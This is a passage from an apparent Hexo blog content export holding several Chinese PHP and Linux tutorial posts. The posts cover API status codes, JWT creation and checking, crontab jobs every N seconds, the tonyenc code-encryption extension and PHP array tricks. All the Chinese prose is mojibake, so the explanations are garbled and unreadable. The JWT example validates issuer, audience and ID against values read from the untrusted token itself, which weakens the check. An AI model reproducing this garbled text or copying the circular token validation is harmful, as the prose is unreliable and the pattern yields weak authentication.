class="punctuation">: </span>290</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 11:19:32 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;You have exceeded your rate limit.&quot;</span>,<span class="attr">&quot;error_code&quot;</span>:<span class="number">42900</span>&#125;</span></span><br></pre></td></tr></table></figure><p>å¿…é¡» ä¸ºæ‰€æœ‰çš„ API è®¾ç½® Rate Limit æ”¯æŒã€‚</p><h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>è¯¥çŠ¶æ€ç  å¿…é¡» åœ¨æœåŠ¡å™¨å‡ºé”™æ—¶æŠ›å‡ºï¼Œå¯¹äºæ‰€æœ‰çš„ 500 é”™è¯¯ï¼Œéƒ½ åº”è¯¥ æä¾›å®Œæ•´çš„é”™è¯¯ä¿¡æ¯æ”¯æŒï¼Œä¹Ÿæ–¹ä¾¿è·Ÿè¸ªè°ƒè¯•ã€‚</p><h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨æš‚æ—¶å¤„ç†ä¸å¯ç”¨çŠ¶æ€ï¼Œå½“æœåŠ¡å™¨éœ€è¦ç»´æŠ¤æˆ–ç¬¬ä¸‰æ–¹ API è¯·æ±‚è¶…æ—¶/ä¸å¯è¾¾æ—¶ï¼Œéƒ½ åº”è¯¥ è¿”å›è¯¥çŠ¶æ€ç ï¼Œå…¶ä¸­è‹¥æ˜¯ä¸»åŠ¨å…³é—­ API æœåŠ¡ï¼Œåº”è¯¥åœ¨è¿”å›çš„å“åº”é¦–éƒ¨åŠ ä¸Š Retry-After å¤´éƒ¨ï¼Œè¡¨ç¤ºå¤šå°‘ç§’åå¯ä»¥å†æ¬¡è®¿é—®ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">503</span> Service Unavailable</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:56:20 GMT</span><br><span class="line"><span class="attribute">Retry-After</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">50300</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;æœåŠ¡ç»´æŠ¤ä¸­&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä»– HTTP çŠ¶æ€ç è¯·å‚è€ƒ <a href="https://link.juejin.im/?target=https://zh.wikipedia.org/zh-hans/HTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581">HTTP çŠ¶æ€ç - ç»´åŸºç™¾ç§‘</a>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> api </category>
          
      </categories>
      
      
        <tags>
            
            <tag> api </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½»æ¾ç”Ÿæˆjwtçš„æ’ä»¶</title>
      <link href="post/60442/"/>
      <url>post/60442/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>json web tokenï¼Œæ— éœ€å¤šè¯´</p><span id="more"></span><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require lcobucci/jwt</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h3><ul><li>iss ã€issuerã€‘å‘å¸ƒè€…çš„urlåœ°å€</li><li>aud ã€audienceã€‘æ¥å—è€…çš„urlåœ°å€</li><li>sub ã€subjectã€‘è¯¥JWTæ‰€é¢å‘çš„ç”¨æˆ·ï¼Œç”¨äºå¤„ç†ç‰¹å®šåº”ç”¨ï¼Œä¸æ˜¯å¸¸ç”¨çš„å­—æ®µ</li><li>exp ã€expirationã€‘ è¯¥jwté”€æ¯çš„æ—¶é—´ï¼›unixæ—¶é—´æˆ³</li><li>nbf ã€not beforeã€‘ è¯¥jwtçš„ä½¿ç”¨æ—¶é—´ä¸èƒ½æ—©äºè¯¥æ—¶é—´ï¼›unixæ—¶é—´æˆ³</li><li>iat ã€issued atã€‘ è¯¥jwtçš„å‘å¸ƒæ—¶é—´ï¼›unix æ—¶é—´æˆ³</li><li>jti ã€JWT IDã€‘è¯¥jwtçš„å”¯ä¸€IDç¼–å·</li></ul><h3 id="ç”Ÿæˆtoken"><a href="#ç”Ÿæˆtoken" class="headerlink" title="ç”Ÿæˆtoken"></a>ç”Ÿæˆtoken</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Builder</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Hmac</span>\<span class="title">Sha256</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Key</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘å¸ƒç«¯url</span></span><br><span class="line"><span class="variable">$iss</span> = <span class="string">&#x27;http://admin.jwt.com&#x27;</span>;</span><br><span class="line"><span class="comment">//è¯·æ±‚ç«¯URL</span></span><br><span class="line"><span class="variable">$aud</span> = <span class="string">&#x27;http://api.jwt.com/user/login&#x27;</span>;</span><br><span class="line"><span class="comment">//å”¯ä¸€çš„jwt id</span></span><br><span class="line"><span class="variable">$jwt_id</span> = <span class="string">&#x27;jwt123&#x27;</span>;</span><br><span class="line"><span class="comment">//ç§é’¥ï¼Œç”¨äºtokenéªŒè¯</span></span><br><span class="line"><span class="variable">$signer_key</span> = <span class="string">&#x27;jwt-test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$signer</span> = <span class="keyword">new</span> Sha256();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = (<span class="keyword">new</span> Builder())-&gt;issuedBy(<span class="variable">$iss</span>)</span><br><span class="line">                        -&gt;permittedFor(<span class="variable">$aud</span>)</span><br><span class="line">                        -&gt;identifiedBy(<span class="variable">$jwt_id</span>, <span class="literal">true</span>)</span><br><span class="line">                        -&gt;issuedAt(time())</span><br><span class="line">                        -&gt;canOnlyBeUsedAfter(time() + <span class="number">60</span>)</span><br><span class="line">                        -&gt;expiresAt(time() + <span class="number">3600</span>)</span><br><span class="line">                        -&gt;set(<span class="string">&#x27;user&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;police&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span> =&gt; <span class="string">&#x27;110&#x27;</span>])</span><br><span class="line">                        -&gt;withClaim(<span class="string">&#x27;uid&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                        -&gt;getToken(<span class="variable">$signer</span>, <span class="keyword">new</span> Key(<span class="variable">$signer_key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="éªŒè¯token"><a href="#éªŒè¯token" class="headerlink" title="éªŒè¯token"></a>éªŒè¯token</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">ValidationData</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Parser</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Hmac</span>\<span class="title">Sha256</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$token</span>  = (<span class="keyword">new</span> Parser())-&gt;parse((<span class="keyword">string</span>) <span class="variable">$token</span>);</span><br><span class="line"><span class="variable">$signer</span> = <span class="keyword">new</span> Sha256();</span><br><span class="line"></span><br><span class="line"><span class="variable">$aud</span>    = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;aud&#x27;</span>);</span><br><span class="line"><span class="variable">$iss</span>    = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;iss&#x27;</span>);</span><br><span class="line"><span class="variable">$jwt_id</span> = <span class="variable">$token</span>-&gt;getHeader(<span class="string">&#x27;jti&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>   = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$signer_key</span> = <span class="string">&#x27;jwt-test&#x27;</span>;  <span class="comment">//ç§é’¥</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> ValidationData();</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>-&gt;setIssuer(<span class="variable">$iss</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;setAudience(<span class="variable">$aud</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;setId(<span class="variable">$jwt_id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//éªŒè¯ç§é’¥</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;verify(<span class="variable">$signer</span>, <span class="variable">$signer_key</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤±è´¥ï¼Œå› ä¸ºtokenåœ¨60ç§’åæ–¹å¯éªŒè¯</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹éªŒè¯æ—¶é—´</span></span><br><span class="line"><span class="variable">$data</span>-&gt;setCurrentTime(time() + <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>-&gt;setCurrentTime(time() + <span class="number">4000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//false,tokenè¿‡æœŸ</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crontabå®ç°Nç§’å®šæ—¶</title>
      <link href="post/65133/"/>
      <url>post/65133/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>crontab å‘½ä»¤æœ€å°çš„æ‰§è¡Œæ—¶é—´æ˜¯ä¸€åˆ†é’Ÿï¼Œæœ‰æ—¶éœ€è¦æŒ‰ç§’æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥å®ç°</p><span id="more"></span><h3 id="ä½¿ç”¨å»¶æ—¶æ¥å®ç°æ¯Nç§’æ‰§è¡Œ"><a href="#ä½¿ç”¨å»¶æ—¶æ¥å®ç°æ¯Nç§’æ‰§è¡Œ" class="headerlink" title="ä½¿ç”¨å»¶æ—¶æ¥å®ç°æ¯Nç§’æ‰§è¡Œ"></a>ä½¿ç”¨å»¶æ—¶æ¥å®ç°æ¯Nç§’æ‰§è¡Œ</h3><p>é€šè¿‡å»¶æ—¶æ–¹æ³• sleep N æ¥å®ç°æ¯Nç§’æ‰§è¡Œï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªphpè„šæœ¬test.php,æœ¬ä¾‹test.phpæ”¾åœ¨homeç›®å½•ä¸‹ï¼ŒåŠŸèƒ½æ˜¯æŠŠå½“å‰æ—¶é—´å†™å…¥/log/run.log</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä»¥ä¸‹è¯­å¥ä¿å­˜é€€å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* * * * * php /home/test.php</span><br><span class="line">* * * * * sleep 10; php /home/test.php</span><br><span class="line">* * * * * sleep 20; php /home/test.php</span><br><span class="line">* * * * * sleep 30; php /home/test.php</span><br><span class="line">* * * * * sleep 40; php /home/test.php</span><br><span class="line">* * * * * sleep 50; php /home/test.php</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ tail -f æŸ¥çœ‹æ‰§è¡Œæƒ…å†µ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /log/run.log</span><br></pre></td></tr></table></figure><p>60å¿…é¡»èƒ½æ•´é™¤é—´éš”çš„ç§’æ•°ï¼Œå¦‚æœé—´éš”çš„ç§’æ•°å¤ªå°‘ï¼Œä¾‹å¦‚2ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±éœ€è¦åœ¨crontab åŠ å…¥60/2=30æ¡è¯­å¥</p><h3 id="ç¼–å†™shellè„šæœ¬å®ç°"><a href="#ç¼–å†™shellè„šæœ¬å®ç°" class="headerlink" title="ç¼–å†™shellè„šæœ¬å®ç°"></a>ç¼–å†™shellè„šæœ¬å®ç°</h3><p>åœ¨è„šæœ¬ä¸­ä½¿ç”¨forè¯­å¥æŒ‡å®šç§’æ•°æ‰§è¡Œï¼Œåˆ›å»ºè„šæœ¬æ–‡ä»¶crontab.sh,jæœ¬ä¾‹æ”¾åœ¨homeç›®å½•ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">step=2 #é—´éš”çš„ç§’æ•°ï¼Œä¸èƒ½å¤§äº60</span><br><span class="line"></span><br><span class="line">for (( i = 0; i &lt; 60; i=(i+step) )); do</span><br><span class="line">    $(php &#x27;/home/test.php&#x27;)</span><br><span class="line">    sleep $step</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>crontab -e è¾“å…¥ä»¥ä¸‹è¯­å¥åä¿å­˜é€€å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ tail -f æŸ¥çœ‹æ‰§è¡Œæƒ…å†µï¼Œå¯ä»¥å‘ç°run.logæ¯2ç§’è¢«å†™å…¥ä¸€æ¡è®°å½•ã€‚å¦‚æœ60ä¸èƒ½æ•´é™¤é—´éš”çš„ç§’æ•°ï¼Œåˆ™éœ€è¦è°ƒæ•´æ‰§è¡Œçš„æ—¶é—´ã€‚ä¾‹å¦‚éœ€è¦æ¯7ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå°±éœ€è¦æ‰¾åˆ°7ä¸60çš„æœ€å°å…¬å€æ•°ï¼Œ7ä¸60çš„æœ€å°å…¬å€æ•°æ˜¯420ï¼ˆå³7åˆ†é’Ÿï¼‰ã€‚</p><p>åˆ™ crontab.sh stepçš„å€¼ä¸º7ï¼Œå¾ªç¯ç»“æŸæ¡ä»¶i&lt;420ï¼Œ crontab=â€â€ -eå¯ä»¥è¾“å…¥ä»¥ä¸‹è¯­å¥æ¥å®ç°:<code>&lt;=&quot;&quot; p=&quot;&quot;&gt;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/7 * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç åŠ å¯†-tonyenc</title>
      <link href="post/50056/"/>
      <url>post/50056/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ€è¿‘å…¬å¸å‡ºå”®äº†ä¸€ä¸ªé¡¹ç›®ï¼Œå•†ä¸šæºç è‡ªç„¶è¦åŠ å¯†ï¼Œç½‘ä¸Šçš„ä¸€äº›åŠ å¯†è¢«ç ´è§£çš„å¯èƒ½æ€§è¾ƒå¤§ï¼Œç”¨èµ·æ¥ä¹Ÿä¸æ–¹ä¾¿ï¼Œä½œä¸ºgithubçš„ä¼Ÿå¤§æ¬è¿å·¥ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç®€æ´ã€é«˜æ€§èƒ½ã€è·¨å¹³å°çš„ PHP7 ä»£ç åŠ å¯†æ‰©å±•-tonyenc</p><span id="more"></span><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lihancong/tonyenc">https://github.com/lihancong/tonyenc</a></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lihancong/tonyenc</span><br><span class="line"></span><br><span class="line">cd tonyenc</span><br><span class="line"></span><br><span class="line">phpize</span><br><span class="line"></span><br><span class="line">./configure --with-php-config = [è‡ªå·±phpç‰ˆæœ¬çš„php-configæ–‡ä»¶]</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><blockquote><p>phpç‰ˆæœ¬è¦7.0ä»¥ä¸Š</p></blockquote><p>ä¿®æ”¹php.iniæ–‡ä»¶è¿½åŠ æ‰©å±•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=tonyenc.so</span><br></pre></td></tr></table></figure><blockquote><p>MAMPè½¯ä»¶ä¸­ä¿®æ”¹php.iniæ¨¡ç‰ˆæ–‡ä»¶ï¼Œæ˜¯æ— æ•ˆçš„ï¼Œè¦ä¿®æ”¹çœŸå®çš„php.iniæ–‡ä»¶</p></blockquote><p>æå®šåé‡å¯ç¯å¢ƒï¼Œæµ‹è¯•æ˜¯å¦æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -m |grep tonyenc</span><br></pre></td></tr></table></figure><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><h4 id="åŠ å¯†ä¸å¯é€†ï¼Œåˆ‡è®°è¦å¤‡ä»½ï¼ï¼ï¼ï¼"><a href="#åŠ å¯†ä¸å¯é€†ï¼Œåˆ‡è®°è¦å¤‡ä»½ï¼ï¼ï¼ï¼" class="headerlink" title="åŠ å¯†ä¸å¯é€†ï¼Œåˆ‡è®°è¦å¤‡ä»½ï¼ï¼ï¼ï¼"></a>åŠ å¯†ä¸å¯é€†ï¼Œåˆ‡è®°è¦å¤‡ä»½ï¼ï¼ï¼ï¼</h4><p>åŠ å¯†æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å®ƒæä¾›äº†ï¼Œåå­—å«tonyenc.phpï¼Œå¤åˆ¶ä¿å­˜åˆ°åˆé€‚ä½ç½®ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php tonyenc.php [éœ€è¦åŠ å¯†çš„æ–‡ä»¶æˆ–è·¯å¾„]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŸ­é“¾æ¥</title>
      <link href="post/61992/"/>
      <url>post/61992/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘ä¸€ä¸ªé¡¹ç›®ä¸­è¦æ±‚ä½¿ç”¨çŸ­é“¾æ¥ï¼Œè°·æ­Œäº†ä¸€ä¸‹æ˜ç™½åŸºæœ¬åŸç†ï¼Œæ‡’å¾—è‡ªå·±åŠ¨æ‰‹ï¼Œéšä¾¿æ‰¾äº†ä¸€ä¸ªphp githubé¡¹ç›®</p><h3 id="githubé¡¹ç›®åœ°å€"><a href="#githubé¡¹ç›®åœ°å€" class="headerlink" title="githubé¡¹ç›®åœ°å€"></a>githubé¡¹ç›®åœ°å€</h3><p><a href="https://github.com/achais/shorturl">https://github.com/achais/shorturl</a></p><h3 id="æ–°æµªå¾®åšapp-key"><a href="#æ–°æµªå¾®åšapp-key" class="headerlink" title="æ–°æµªå¾®åšapp key"></a>æ–°æµªå¾®åšapp key</h3><p><a href="https://fengmk2.com/blog/appkey.html">https://fengmk2.com/blog/appkey.html</a></p><p>åŸºæœ¬å®ç°éœ€æ±‚</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0 1 äº’è½¬</title>
      <link href="post/47721/"/>
      <url>post/47721/</url>
      
        <content type="html"><![CDATA[<p>å¹³æ—¶ç¿»è½¬0ã€1æ“ä½œï¼Œä¸€èˆ¬ä½¿ç”¨ifè¯­å¥æˆ–ä¸‰ç›®è¿ç®—ç¬¦å®Œæˆï¼Œæœ‰äº›ç¹ç</p><h3 id="æŒ‰ä½é"><a href="#æŒ‰ä½é" class="headerlink" title="æŒ‰ä½é"></a>æŒ‰ä½é</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">~value + 2</span>;</span><br></pre></td></tr></table></figure><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>^ <span class="number">1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="symbol">1 </span>^ <span class="number">0</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·§ç”¨PHPæ•°ç»„å‡½æ•°</title>
      <link href="post/32349/"/>
      <url>post/32349/</url>
      
        <content type="html"><![CDATA[<p>PHP çš„æ•°ç»„æ˜¯ä¸€ç§å¾ˆå¼ºå¤§çš„æ•°æ®ç±»å‹ï¼Œä¸æ­¤åŒæ—¶ PHP å†…ç½®äº†ä¸€ç³»åˆ—ä¸æ•°ç»„ç›¸å…³çš„å‡½æ•°å¯ä»¥å¾ˆè½»æ˜“çš„å®ç°æ—¥å¸¸å¼€å‘çš„åŠŸèƒ½ï¼Œå–„ç”¨ PHP å†…ç½®å‡½æ•°èƒ½æå¤§çš„æé«˜å¼€å‘æ•ˆç‡å’Œè¿è¡Œæ•ˆç‡ï¼ˆå†…ç½®å‡½æ•°éƒ½æ˜¯ç”¨ C å†™çš„æ•ˆç‡æ¯”ç”¨ PHP å†™çš„é«˜å¾ˆå¤šï¼‰</p><span id="more"></span><h3 id="å–æŒ‡å®šé”®å"><a href="#å–æŒ‡å®šé”®å" class="headerlink" title="å–æŒ‡å®šé”®å"></a>å–æŒ‡å®šé”®å</h3><p>å¯¹äºæŸäº›å…³è”æ•°ç»„ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åªæƒ³å–æŒ‡å®šé”®åçš„é‚£éƒ¨åˆ†ï¼Œæ¯”å¦‚æ•°ç»„ä¸º <code>[&#39;id&#39; =&gt; 1, &#39;name&#39; =&gt; &#39;zane&#39;, &#39;password&#39; =&gt; &#39;123456&#39;]</code> æ­¤æ—¶è‹¥åªæƒ³å–åŒ…å« id å’Œ name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;zane&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>];</span><br><span class="line"><span class="comment">// è‡ªå·±ç”¨ PHP å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onlyKeys</span>(<span class="params"><span class="variable">$raw</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$new</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$raw</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$key</span>, <span class="variable">$keys</span>)) 